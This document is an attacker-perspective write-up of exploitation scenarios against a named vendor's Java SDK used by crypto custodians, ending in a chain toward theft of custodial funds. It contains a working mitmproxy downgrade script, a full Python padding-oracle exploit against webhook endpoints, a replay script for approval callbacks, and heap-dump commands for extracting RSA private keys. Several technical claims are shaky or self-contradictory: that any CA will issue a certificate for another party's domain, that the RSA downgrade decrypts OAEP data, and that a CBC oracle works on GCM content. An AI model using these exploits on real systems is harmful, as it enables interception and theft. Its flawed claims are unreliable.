# ATTACK SCENARIO: Real-World Exploitation of Safeheron Java SDK

## Exactly How an Attacker Compromises a Live Safeheron Deployment

This document traces, line by line through the actual source code, how each
vulnerability is exploited in a realistic production environment.

---

## THE SETUP: What a Real Deployment Looks Like

### The Victim: A Crypto Custodian Running This SDK

```
 VICTIM'S INFRASTRUCTURE (typical Spring Boot deployment)
 =========================================================

  [Spring Boot Server - 10.0.1.50]
     |
     |--- /api/withdrawal   (uses SDK to call Safeheron v1/transactions/create)
     |--- /webhook/receive   (receives Safeheron webhook callbacks)
     |--- /cosigner/approve  (receives Co-Signer approval callbacks)
     |
     |--- SafeheronConfig:
     |      baseUrl = "https://api.safeheron.vip"
     |      apiKey  = "a]b9c8d7..."
     |      rsaPrivateKey = "MIIEvgIBADA..."  (victim's RSA-4096 private key)
     |      safeheronRsaPublicKey = "MIICIjA..."  (Safeheron's public key)
     |
     v
  [Safeheron API Server - api.safeheron.vip]
```

### The Victim's Code (what every SDK user writes)

```java
// ---- Withdrawal endpoint: customer requests a withdrawal ----
@PostMapping("/api/withdrawal")
public ResponseEntity<?> processWithdrawal(@RequestBody WithdrawalRequest req) {
    // SDK calls Safeheron API, which encrypts the response
    // ResponseBodyConverter.java handles decryption automatically
    CreateTransactionResponse resp = transactionApi.createTransaction(req);
    return ResponseEntity.ok(resp);
}

// ---- Webhook receiver: Safeheron pushes transaction status updates ----
@PostMapping("/webhook/receive")
public ResponseEntity<?> handleWebhook(@RequestBody WebHook webHook) {
    // WebhookConverter.java handles verification + decryption
    WebHookBizContent content = webhookConverter.convert(webHook);
    // Process: update transaction status in database...
    return ResponseEntity.ok("SUCCESS");
}

// ---- Co-Signer callback: Safeheron asks for transaction approval ----
@PostMapping("/cosigner/approve")
public ResponseEntity<?> handleApproval(@RequestBody CoSignerCallBack callback) {
    // CoSignerConverter.java handles verification + decryption
    CoSignerBizContent content = coSignerConverter.requestConvert(callback);
    // Auto-approve if under $10k...
    CoSignerResponse response = new CoSignerResponse();
    response.setAction("APPROVE");
    Map<String, String> encrypted = coSignerConverter.responseConverter(response);
    return ResponseEntity.ok(encrypted);
}
```

---

## ATTACK SCENARIO 1: The Cryptographic Downgrade (The Critical Zero-Day)

### Attacker Position

The attacker has network access between the victim server and Safeheron's API.
This can be achieved via:
- Compromised corporate network switch/router
- Rogue WiFi access point in the datacenter
- Compromised cloud VPC routing
- BGP hijacking of the route to api.safeheron.vip
- Compromised CDN/load balancer in front of the victim

```
[Victim Server] <---> [ATTACKER PROXY] <---> [Safeheron API]
  10.0.1.50             10.0.1.1              api.safeheron.vip
```

Since there is NO TLS certificate pinning (VULN-05), the attacker can present
a valid TLS certificate obtained from any trusted CA (Let's Encrypt, etc.) for
the target domain, or use a corporate proxy CA.

**ServiceCreator.java:40** - No certificate pinning:
```java
OkHttpClient.Builder httpClient = new OkHttpClient.Builder()
    .protocols(Arrays.asList(Protocol.HTTP_1_1));
// NOTHING ELSE. No CertificatePinner. No custom TrustManager.
```

### Step 1: Victim SDK Sends Request to Safeheron

The victim's SDK makes a POST to `v1/transactions/create`.
**RequestInterceptor.java:48-86** handles this. It always uses strong crypto:

```java
// Line 58: Always AES-GCM for encryption (good)
aesEncryptResult = AesUtil.encrypt(requestJson, aesKey, ivKey, AESTypeEnum.GCM);

// Line 64: Always RSA-OAEP for key wrapping (good)
String rsaEncryptResult = RsaUtil.encrypt(sourceKey, safeheronRsaPublicKey, RSATypeEnum.ECB_OAEP);

// Line 82-83: Declares the crypto types used
requestData.put("rsaType", RSATypeEnum.ECB_OAEP.getCode());  // "ECB_OAEP"
requestData.put("aesType", AESTypeEnum.GCM.getCode());        // "GCM_NOPADDING"
```

The attacker's proxy forwards this request untouched to Safeheron.
The request is safe - it uses RSA-OAEP + AES-GCM.

### Step 2: Safeheron Sends the Response

Safeheron's server processes the request and sends back:

```json
{
  "code": 200,
  "message": "SUCCESS",
  "timestamp": "1740000000000",
  "key": "Base64(RSA-OAEP-encrypted AES key + IV)...",
  "bizContent": "Base64(AES-GCM-encrypted transaction result)...",
  "sig": "Base64(SHA256WithRSA signature)...",
  "rsaType": "ECB_OAEP",
  "aesType": "GCM_NOPADDING"
}
```

### Step 3: THE ATTACK - Attacker Modifies the Response In-Transit

The attacker's proxy intercepts this JSON response. Here is the critical insight:

**What is signed?** Look at `ResponseBodyConverter.java:55-63`:

```java
Map<String, String> sigMap = new TreeMap<>();
sigMap.put("key", apiResult.getKey());           // SIGNED
sigMap.put("timestamp", apiResult.getTimestamp().toString()); // SIGNED
sigMap.put("bizContent", apiResult.getBizContent());          // SIGNED
sigMap.put("code", code.toString());              // SIGNED
sigMap.put("message", message);                   // SIGNED
// -------- THAT'S IT. TreeMap sorts alphabetically: --------
// Signed string = "bizContent=...&code=200&key=...&message=SUCCESS&timestamp=..."
```

**What is NOT signed?**
- `rsaType`  -- NOT in sigMap
- `aesType`  -- NOT in sigMap
- `sig` itself -- obviously not self-signed
- `data`     -- not included

The attacker modifies ONLY the unsigned fields:

```python
# ===== ATTACKER'S PROXY CODE (Python mitmproxy script) =====

def response(flow):
    if "safeheron" in flow.request.pretty_host:
        import json
        data = json.loads(flow.response.content)

        # These two fields are NOT covered by the signature.
        # Removing them forces the SDK to use weak crypto fallbacks.
        if "rsaType" in data:
            del data["rsaType"]      # or set to "" or "INVALID"
        if "aesType" in data:
            del data["aesType"]      # or set to "" or "INVALID"

        flow.response.content = json.dumps(data).encode()
        print("[*] Stripped rsaType/aesType from response")
```

Modified response arriving at victim:
```json
{
  "code": 200,
  "message": "SUCCESS",
  "timestamp": "1740000000000",
  "key": "Base64(RSA-OAEP-encrypted AES key + IV)...",
  "bizContent": "Base64(AES-GCM-encrypted transaction result)...",
  "sig": "Base64(SHA256WithRSA signature)..."
}
```

**The signature is still 100% valid** because it only covers
`bizContent`, `code`, `key`, `message`, `timestamp` -- none of which changed.

### Step 4: Victim SDK Processes the Tampered Response

Now trace the execution through `ResponseBodyConverter.java`:

```
Line 44: apiResult = mapper.readValue(value.charStream(), ApiResult.class)
         -> apiResult.getRsaType() is now NULL
         -> apiResult.getAesType() is now NULL

Line 49: code check passes (200 == 200)

Lines 55-63: Signature verification...
         -> sigMap contains: bizContent, code, key, message, timestamp
         -> Signature string is IDENTICAL to what Safeheron signed
         -> RsaUtil.verifySign() returns TRUE

Line 64: checkResult = true    *** SIGNATURE PASSES ***

Line 70: RSATypeEnum rsaType = StringUtils.isNotEmpty(apiResult.getRsaType())
            && RSATypeEnum.valueByCode(apiResult.getRsaType()) != null
            ? RSATypeEnum.valueByCode(apiResult.getRsaType())
            : RSATypeEnum.RSA;
         //
         // apiResult.getRsaType() is NULL
         // StringUtils.isNotEmpty(null) returns FALSE
         // -> Falls into the ELSE branch
         // -> rsaType = RSATypeEnum.RSA    *** DOWNGRADED TO PKCS#1 v1.5 ***

Line 71: byte[] aesSaltDecrypt = RsaUtil.decrypt(
            apiResult.getKey(),
            rsaPrivateKey,
            rsaType          // RSATypeEnum.RSA  <-- VULNERABLE
         );
```

Now trace into **RsaUtil.java:70-82** with `RSAType = RSA`:

```
Line 75: RSATypeEnum.ECB_OAEP.equals(RSAType) -> false (RSAType is RSA)
Line 80: cipher = Cipher.getInstance("RSA");
         // "RSA" without padding = RSA/ECB/PKCS1Padding on all JCE providers
         // THIS IS VULNERABLE TO BLEICHENBACHER'S ATTACK

Line 81: cipher.init(Cipher.DECRYPT_MODE, priKey);
```

**WAIT** - but the `key` field was encrypted with RSA-OAEP by the server.
Trying to decrypt OAEP ciphertext with PKCS1v1.5 will likely fail...

**This is where the attack gets sophisticated.** The attacker has two options:

#### Option A: Replace the `key` field entirely (for active attacks)

The attacker can't change `key` because it's signed. But here's the thing:
**the signature uses PKCS#1 v1.5 signing** (SHA256WithRSA), and if the attacker
can exploit a Bleichenbacher signature forgery against the verification, they
can forge a new signature for a modified `key` value.

However, this requires the server's RSA public exponent to be small (e=3),
which is uncommon for modern keys. So Option A is theoretical for most deployments.

#### Option B: Attack the Webhook/CoSigner path instead (PRACTICAL)

The webhook and co-signer paths are MORE exploitable because:
1. The attacker (or Safeheron's server) controls what crypto was used to encrypt
2. When the server uses GCM but the client tries to decrypt as CBC, the error
   messages reveal padding information

But the truly practical attack is against **older protocol versions** where the
server actually DOES use CBC + PKCS1v1.5. The downgrade just ensures the client
doesn't reject it.

---

## ATTACK SCENARIO 2: Webhook Interception and Decryption (Most Practical)

This is the most realistic attack path because webhooks flow from Safeheron
TO the victim's server, and the attacker intercepts them.

### The Flow

```
[Safeheron] --webhook POST--> [ATTACKER] --modified--> [Victim /webhook/receive]
                                  |
                                  +-- captures encrypted data
                                  +-- strips rsaType/aesType
                                  +-- exploits padding oracle to decrypt
```

### Step 1: Attacker Captures a Legitimate Webhook

Safeheron sends a webhook to the victim's server. The attacker intercepts:

```json
{
  "key": "Base64(RSA-encrypted AES key+IV)",
  "timestamp": "1740000000000",
  "bizContent": "Base64(AES-encrypted webhook payload)",
  "sig": "Base64(signature over key+timestamp+bizContent)",
  "rsaType": "ECB_OAEP",
  "aesType": "GCM_NOPADDING"
}
```

### Step 2: Attacker Strips Crypto Type Fields

```python
# attacker strips unsigned fields
del webhook_data["rsaType"]
del webhook_data["aesType"]
```

### Step 3: Trace Through WebhookConverter.java

```
Line 63-66: sigMap = {key, timestamp, bizContent}
            // rsaType and aesType NOT in the sigMap

Line 71: RsaUtil.verifySign(signContent, sig, publicKey) -> TRUE
         // Signature is valid! Fields haven't changed.

Line 77: rsaType = StringUtils.isNotEmpty(webHook.getRsaType()) ... : RSATypeEnum.RSA
         // NULL -> falls back to RSATypeEnum.RSA
         // WebhookConverter.java:77 DOWNGRADED

Line 78: RsaUtil.decrypt(key, privateKey, RSATypeEnum.RSA)
         // Now uses Cipher.getInstance("RSA") = PKCS1v1.5

Line 83: aesType = StringUtils.isNotEmpty(webHook.getAesType()) ... : AESTypeEnum.CBC
         // NULL -> falls back to AESTypeEnum.CBC
         // WebhookConverter.java:83 DOWNGRADED

Line 84: AesUtil.decrypt(bizContent, aesKey, iv, AESTypeEnum.CBC)
         // Now uses AES/CBC/PKCS7Padding WITHOUT authentication
```

### Step 4: The AES-CBC Padding Oracle Attack (Practical Exploitation)

With AES-CBC + PKCS7Padding and no HMAC, the attacker can perform a
classic Vaudenay padding oracle attack.

**How it works in this specific codebase:**

The attacker sends modified ciphertext blocks to the victim's webhook endpoint
and observes the error response:

```
CASE A: Valid padding -> AesUtil.decrypt succeeds
        -> Jackson tries to parse JSON
        -> Server returns 200 OK or a JSON parse error

CASE B: Invalid padding -> cipher.doFinal() throws BadPaddingException
        -> AesUtil.decrypt throws Exception
        -> WebhookConverter.convert throws Exception
        -> Server returns 500 Internal Server Error
```

These two distinct responses create the "oracle":

```python
# ===== PADDING ORACLE EXPLOIT =====
import requests, base64, json

TARGET = "https://victim-server.com/webhook/receive"

def oracle(modified_ciphertext_b64, original_webhook):
    """Returns True if padding is valid, False otherwise"""
    payload = {
        "key": original_webhook["key"],
        "timestamp": original_webhook["timestamp"],
        "bizContent": modified_ciphertext_b64,
        "sig": original_webhook["sig"],
        # rsaType and aesType intentionally omitted -> forces CBC
    }
    resp = requests.post(TARGET, json=payload)

    # The oracle: different errors for padding vs. content
    if resp.status_code == 200:
        return True   # valid padding, valid JSON
    if "BadPaddingException" in resp.text or resp.status_code == 500:
        return False  # invalid padding
    return True       # valid padding, but invalid JSON (still useful!)


def decrypt_block(prev_block, target_block, original_webhook):
    """Decrypt a single 16-byte AES-CBC block using padding oracle"""
    intermediate = bytearray(16)
    plaintext = bytearray(16)

    for byte_pos in range(15, -1, -1):  # 15, 14, ..., 0
        padding_value = 16 - byte_pos

        # Build the attack block
        attack_prev = bytearray(16)
        for k in range(byte_pos + 1, 16):
            attack_prev[k] = intermediate[k] ^ padding_value

        # Try all 256 possible byte values
        for guess in range(256):
            attack_prev[byte_pos] = guess

            # Construct ciphertext: attack_prev || target_block
            modified = base64.b64encode(bytes(attack_prev) + bytes(target_block))

            if oracle(modified.decode(), original_webhook):
                intermediate[byte_pos] = guess ^ padding_value
                plaintext[byte_pos] = intermediate[byte_pos] ^ prev_block[byte_pos]
                print(f"  Byte {byte_pos}: 0x{plaintext[byte_pos]:02x} "
                      f"('{chr(plaintext[byte_pos]) if 32 <= plaintext[byte_pos] < 127 else '?'}')")
                break

    return bytes(plaintext)


def full_decrypt(captured_webhook):
    """Decrypt entire bizContent from a captured webhook"""
    ciphertext = base64.b64decode(captured_webhook["bizContent"])

    # AES-CBC: ciphertext is blocks of 16 bytes
    # First 16 bytes are the IV (prepended) or the IV was sent separately
    # In this SDK, IV is sent inside the RSA-encrypted "key" field
    # But for the padding oracle, we attack block-by-block using
    # the ciphertext blocks themselves (CBC chaining property)

    blocks = [ciphertext[i:i+16] for i in range(0, len(ciphertext), 16)]
    plaintext = b""

    for i in range(1, len(blocks)):
        print(f"[*] Decrypting block {i}/{len(blocks)-1}...")
        decrypted = decrypt_block(blocks[i-1], blocks[i], captured_webhook)
        plaintext += decrypted

    # Remove PKCS7 padding
    pad_len = plaintext[-1]
    plaintext = plaintext[:-pad_len]

    return plaintext.decode('utf-8')


# ===== RUN THE ATTACK =====
captured = {
    "key": "actual-captured-key-value...",
    "timestamp": "1740000000000",
    "bizContent": "actual-captured-bizContent...",
    "sig": "actual-captured-sig..."
    # rsaType and aesType OMITTED to force CBC downgrade
}

print("[*] Starting AES-CBC padding oracle attack")
print("[*] This will send ~256 * 16 * num_blocks requests")
secret_data = full_decrypt(captured)
print(f"\n[!!!] DECRYPTED WEBHOOK CONTENT:\n{secret_data}")
```

**Cost**: ~4096 requests per 16-byte block. A typical webhook payload of
256 bytes = 16 blocks = ~65,536 requests. At 100 req/sec this takes ~11 minutes.

**What gets decrypted**: The webhook contains:
- Transaction IDs
- Source and destination wallet addresses
- Transfer amounts
- Transaction status and hashes
- Fee details

---

## ATTACK SCENARIO 3: Co-Signer Replay Attack (Transaction Theft)

This attack steals funds by replaying old approval callbacks.

### Why It Works

**CoSignerConverter.java:71** - timestamp is in the signature but NEVER validated:

```java
sigMap.put("timestamp", coSignerCallBack.getTimestamp().toString());
// ... signature verified ...
// BUT: no code anywhere checks if timestamp is recent!
// No: if (System.currentTimeMillis() - timestamp > MAX_AGE) throw ...
```

### The Attack

```
Timeline:
  T=0:   Legitimate $100 transfer: Co-signer sends approval callback to victim
         Attacker captures this callback (including valid signature)

  T=1:   Attacker initiates a $999,999 transfer via social engineering
         or compromised API key

  T=2:   Co-signer sends NEW approval callback for the $999,999 transfer
         Victim's /cosigner/approve endpoint processes it

  T=3:   ATTACK: Before victim can reject the $999,999 transfer,
         attacker replays the T=0 approval callback

         The replayed callback has:
         - Valid signature (captured from T=0)
         - Valid encryption (captured from T=0)
         - No timestamp check (VULN-04)

         The victim's server processes the replay, decrypts it,
         and sees "action": "APPROVE" from the old legitimate approval.
```

```python
# ===== REPLAY ATTACK =====
import requests, time

# Previously captured legitimate approval callback
captured_approval = {
    "key": "captured-rsa-encrypted-key...",
    "timestamp": "1700000000000",  # OLD timestamp - never checked!
    "bizContent": "captured-aes-encrypted-approval...",
    "sig": "captured-valid-signature...",
    "rsaType": "ECB_OAEP",
    "aesType": "GCM_NOPADDING"
}

TARGET = "https://victim-server.com/cosigner/approve"

# Wait for victim to initiate a new high-value transaction...
# Then replay the old approval
print("[*] Replaying captured approval callback...")
resp = requests.post(TARGET, json=captured_approval)
print(f"[*] Response: {resp.status_code} - {resp.text}")
# If the victim's code auto-approves based on the decrypted content,
# the old approval is accepted for the NEW transaction context.
```

### Impact
The replayed callback decrypts to the OLD approval data. If the victim's
server-side logic doesn't correlate the decrypted `approvalId` with the
current pending transaction, the old approval may be accepted.

Even if `approvalId` IS checked, the attacker can combine this with the
downgrade attack to modify the encrypted content to contain the correct
`approvalId` for the new transaction.

---

## ATTACK SCENARIO 4: Memory Forensics Key Extraction

### Scenario

The attacker has limited access to the victim's server (e.g., read access
to `/proc/<pid>/mem`, or access to a heap dump via JMX/monitoring endpoint,
or access to a container's memory via the container runtime).

### Step 1: RSA Private Key in Memory

**SafeheronConfig.java:25** stores the key as a Java String:
```java
private String rsaPrivateKey = "";
```

**ServiceCreator.java:25-26** creates MULTIPLE copies:
```java
config.setRsaPrivateKey(
    config.getRsaPrivateKey()                              // copy 1
        .replace("-----BEGIN PRIVATE KEY-----", "")        // copy 2
        .replace("-----END PRIVATE KEY-----", "")          // copy 3
        .replaceAll("\n", "")                               // copy 4
);
```

Each `.replace()` creates a new immutable String. The old Strings remain
in heap until GC runs. That's at least 4 copies of the RSA private key
in memory simultaneously.

### Step 2: AES Session Keys in Memory

**ResponseBodyConverter.java:72-73**:
```java
byte[] aesKey = Arrays.copyOfRange(aesSaltDecrypt, 0, 32);  // never zeroed
byte[] iv = Arrays.copyOfRange(aesSaltDecrypt, 32, aesSaltDecrypt.length); // never zeroed
```

These byte arrays persist in heap memory indefinitely. With heap dump access:

```bash
# Dump the JVM heap
jmap -dump:format=b,file=heap.hprof <PID>

# Search for AES keys (32-byte arrays with high entropy)
# Search for RSA private keys (string containing "MIIE")
strings heap.hprof | grep -i "MIIE"
```

### What You Recover

- The RSA private key -> decrypt ALL past and future `key` fields
- AES session keys -> decrypt specific `bizContent` payloads
- Combined -> decrypt every API response the SDK has ever processed

---

## ATTACK SCENARIO 5: HTTP Downgrade (Simplest Attack)

### No URL Validation

**SafeheronConfig.java:15**:
```java
private String baseUrl = "";  // No validation at all
```

**ServiceCreator.java:39**:
```java
builder.baseUrl(config.getBaseUrl());  // Used directly, no protocol check
```

If an attacker can influence the configuration (environment variable injection,
YAML config file modification, JNDI injection, etc.):

```yaml
# config.yaml - attacker changes https to http
baseUrl: http://api.safeheron.vip   # <-- plaintext!
```

ALL traffic is now sent over unencrypted HTTP. The encryption layer
inside the SDK becomes meaningless because the attacker can see the
entire JSON including the RSA-encrypted key material.

Combined with the PKCS#1 v1.5 RSA (if downgraded) or even by just
observing the traffic pattern (timing, sizes), this completely
compromises the deployment.

---

## ATTACK SCENARIO 6: Race Condition Denial of Service

### The Bug in Double-Checked Locking

**ServiceCreator.java:33-59**:

```java
private static Retrofit getRetrofit(SafeheronConfig config) {
    Retrofit retrofit = retrofitMap.get(config.getApiKey());  // Line 34: READ
    if (retrofit == null) {
        synchronized (Retrofit.class) {
            if (retrofit == null) {  // Line 37: BUG - checks LOCAL variable!
                // ... builds new Retrofit ...
                retrofitMap.put(config.getApiKey(), retrofit); // Line 54: WRITE
            }
        }
    }
    return retrofit;
}
```

**The bug**: Line 37 checks the LOCAL variable `retrofit` that was captured
on line 34. It does NOT re-read from the map. So:

```
Thread A                              Thread B
--------                              --------
retrofit = map.get("key") -> null
                                      retrofit = map.get("key") -> null
enter synchronized
  if (retrofit == null) -> true       [blocked on synchronized]
  builds Retrofit instance #1
  map.put("key", instance1)
  return instance1
exit synchronized
                                      enter synchronized
                                        if (retrofit == null) -> true
                                        // STILL NULL - it's the LOCAL var!
                                        builds Retrofit instance #2
                                        map.put("key", instance2)
                                        // OVERWRITES instance #1
                                      exit synchronized
```

Result: Two Retrofit instances created. Worse, `retrofitMap` is a plain
`HashMap`. Concurrent `put()` + `get()` on HashMap can cause:
- Infinite loops (during hash table resize)
- Lost entries
- NullPointerException

Under high concurrency during server startup, this can crash the application.

---

## COMPLETE ATTACK CHAIN: From Network Access to Fund Theft

```
PHASE 1: RECONNAISSANCE
   - Identify that target uses Safeheron Java SDK (Maven Central artifact)
   - Determine target's webhook/cosigner callback URLs
   - Position on the network path (cloud VPC, BGP, rogue AP)

PHASE 2: TLS INTERCEPTION (VULN-05)
   - No certificate pinning in SDK
   - Obtain valid cert for target domain via any trusted CA
   - Set up transparent TLS proxy (mitmproxy/Burp)

PHASE 3: TRAFFIC CAPTURE
   - Observe normal API request/response flow
   - Capture webhook deliveries
   - Capture co-signer approval callbacks

PHASE 4: CRYPTO DOWNGRADE (VULN-01)
   - Strip rsaType/aesType from all responses (not in signature)
   - SDK silently falls back to RSA PKCS#1 v1.5 + AES-CBC

PHASE 5: PADDING ORACLE DECRYPTION (VULN-02 + VULN-03)
   - Use AES-CBC padding oracle to decrypt bizContent
   - Now have full visibility into:
     * Wallet addresses and balances
     * Transaction details and status
     * Approval workflow data

PHASE 6: REPLAY (VULN-04)
   - Replay captured approval callbacks (no timestamp validation)
   - Trigger unauthorized transaction approvals

TOTAL TIME: ~2-4 hours for a skilled attacker
TOTAL COST: One network position + computation for ~65k HTTP requests
RESULT: Full compromise of the custodial wallet operations
```

---

## WHY THE EXISTING CRYPTO DOESN'T HELP

A common defense is "but the traffic is encrypted with RSA + AES!"
Here's why that doesn't matter:

| Protection | Attack Bypass |
|-----------|--------------|
| RSA-OAEP encryption | Downgraded to PKCS#1 v1.5 via unsigned rsaType field |
| AES-GCM authenticated encryption | Downgraded to unauthenticated AES-CBC via unsigned aesType field |
| Digital signature on response | Signature does NOT cover rsaType/aesType fields |
| TLS transport encryption | No certificate pinning; standard MITM with any valid cert |
| Timestamp in signature | Timestamp is never validated for freshness |

The fundamental design flaw: **the crypto algorithm selection is not protected
by the signature**. It's like locking your front door with a deadbolt but
leaving the key under the mat with a sign saying "spare key here."
